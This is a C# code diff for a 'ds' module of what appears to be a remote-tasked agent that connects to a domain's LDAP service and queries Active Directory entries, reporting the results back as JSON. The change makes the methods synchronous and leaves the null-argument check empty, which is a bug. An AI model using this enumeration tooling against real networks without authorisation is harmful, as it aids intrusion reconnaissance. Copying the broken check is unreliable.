@@ -25,16 +25,16 @@ namespace Agent
         public async Task Execute(ServerJob job)
         {
             DsArgs args = JsonSerializer.Deserialize<DsArgs>(job.task.parameters);
-            if (args is null){
-                return;
+            if(args is null){
+
             }
 
             var actions = new Dictionary<string, Action>
             {
-                { "query", async () => await Query(args, job.task.id) },
-                { "connect", async () => await Connect(args, job.task.id) },
-                { "disconnect", async () => await Disconnect(job.task.id) },
-                { "set", async () => await Set(args, job.task.id) }
+                { "query", () => Query(args, job.task.id) },
+                { "connect", () => Connect(args, job.task.id) },
+                { "disconnect", () => Disconnect(job.task.id) },
+                { "set", () => Set(args, job.task.id) }
             };
 
             string action = args.action;
@@ -42,7 +42,7 @@ namespace Agent
                 func();
             }
             else{
-                await messageManager.WriteLine("No valid command specified", job.task.id, true, "error");
+                messageManager.WriteLine("No valid command specified", job.task.id, true, "error");
             }
         }
         static string GetBaseDN(string domain)
@@ -51,17 +51,17 @@ namespace Agent
             return string.Join(",", domainComponents.Select(component => $"DC={component}"));
         }
 
-        async Task Set(DsArgs args, string task_id)
+        void Set(DsArgs args, string task_id)
         {
-            await messageManager.WriteLine("Not implemented yet!", task_id, true, "error");
+            messageManager.WriteLine("Not implemented yet!", task_id, true, "error");
         }
 
-        async Task Connect(DsArgs args, string task_id)
+        void Connect(DsArgs args, string task_id)
         {
             LdapDirectoryIdentifier directoryIdentifier;
             if (!this.TryGetDomain(args, out domain))
             {
-                await messageManager.WriteLine("Failed to identify domain, please specify using the domain switch", task_id, true, "error");
+                messageManager.WriteLine("Failed to identify domain, please specify using the domain switch", task_id, true, "error");
                 return;
             }
 
@@ -72,11 +72,11 @@ namespace Agent
             try
             {
                 ldapConnection.Bind();
-                await messageManager.WriteLine($"Successfully bound to LDAP at {domain}", task_id, true);
+                messageManager.WriteLine($"Successfully bound to LDAP at {domain}", task_id, true);
             }
             catch (Exception e)
             {
-                await messageManager.WriteLine(e.ToString(), task_id, true, "error");
+                messageManager.WriteLine(e.ToString(), task_id, true, "error");
             }
         }
         bool TryGetDomain(DsArgs args, out string domain)
@@ -127,20 +127,20 @@ namespace Agent
             }
         }
 
-        async Task Disconnect(string task_id)
+        void Disconnect(string task_id)
         {
             if(ldapConnection is null){
                 return;
             }
             ldapConnection.Dispose();
-            await messageManager.WriteLine("Connection Disposed", task_id, true);
+            messageManager.WriteLine("Connection Disposed", task_id, true);
         }
 
-        async Task Query(DsArgs args, string task_id)
+        void Query(DsArgs args, string task_id)
         {
             if (ldapConnection is null)
             {
-                await messageManager.WriteLine("No active LDAP connection, try running ds connect first.", task_id, true, "error");
+                messageManager.WriteLine("No active LDAP connection, try running ds connect first.", task_id, true, "error");
                 return;
             }
 
@@ -168,11 +168,11 @@ namespace Agent
                 SearchRequest request = new SearchRequest(searchBase, ldapFilter, SearchScope.Subtree, properties);
                 request.TimeLimit = TimeSpan.FromSeconds(120);
                 SearchResponse response = (SearchResponse)ldapConnection.SendRequest(request);
-                await messageManager.WriteLine(JsonSerializer.Serialize(response.Entries), task_id, true);
+                messageManager.WriteLine(JsonSerializer.Serialize(response.Entries), task_id, true);
             }
             catch (Exception e)
             {
-                await messageManager.WriteLine(e.ToString(), task_id, true, "error");
+                messageManager.WriteLine(e.ToString(), task_id, true, "error");
             }
         }
 
